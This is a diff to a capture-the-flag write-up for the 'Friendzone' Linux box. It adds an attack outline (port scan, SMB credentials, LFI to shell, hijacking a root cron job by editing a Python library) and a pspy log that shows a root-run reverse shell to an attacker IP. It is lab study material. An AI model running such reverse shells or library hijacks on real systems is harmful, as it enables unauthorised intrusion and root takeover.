@@ -1,5 +1,22 @@
 #linux 
 
+# Story
+1. Port scan, https has friendzone.red domain
+2. Check http website, friendzoneportal.red seems interesting
+3. Check https as well, there are some information about js in source code
+4. Check smb, some are readable and writable meaning that we can upload?
+5. Find some creds in smb
+6. dig more domains
+7. Check login websites
+8. LFI is available
+9. Get shell through LFI (user flag)
+10. www-data to friend through sql conf file
+11. check cron jobs using pspy
+12. check the python code and it uses certain libraries
+13. check the permission for libraries and add some lines
+14. open nc and wait for cron job to run python file
+15. get the flag (root flag)
+
 # Enumeration
 ## Nmap port scan
 
@@ -555,6 +572,18 @@ os.py has permission
 
 ### pspy
 check cron
+
+```
+2023/02/26 05:42:01 CMD: UID=0     PID=9320   | /bin/sh -c /opt/server_admin/reporter.py                                                        
+2023/02/26 05:42:01 CMD: UID=0     PID=9319   | /bin/sh -c /opt/server_admin/reporter.py                                                        
+2023/02/26 05:42:01 CMD: UID=0     PID=9318   | /usr/sbin/CRON -f 
+2023/02/26 05:42:01 CMD: UID=0     PID=9321   | /usr/bin/python /opt/server_admin/reporter.py                                                   
+2023/02/26 05:42:01 CMD: UID=0     PID=9322   | /bin/bash -c bash -i >& /dev/tcp/10.10.14.26/1234 0>&1                                          
+2023/02/26 05:42:01 CMD: UID=0     PID=9323   | /bin/bash -c bash -i >& /dev/tcp/10.10.14.26/1234 0>&1                                          
+```
+We can run reporter.py as root, so if we can somehow put bin/bash or revshell in the code then we are goot.
+
+## Perform escalation
 
 append revshell at the end so it becomes something like this.
 ```os.py
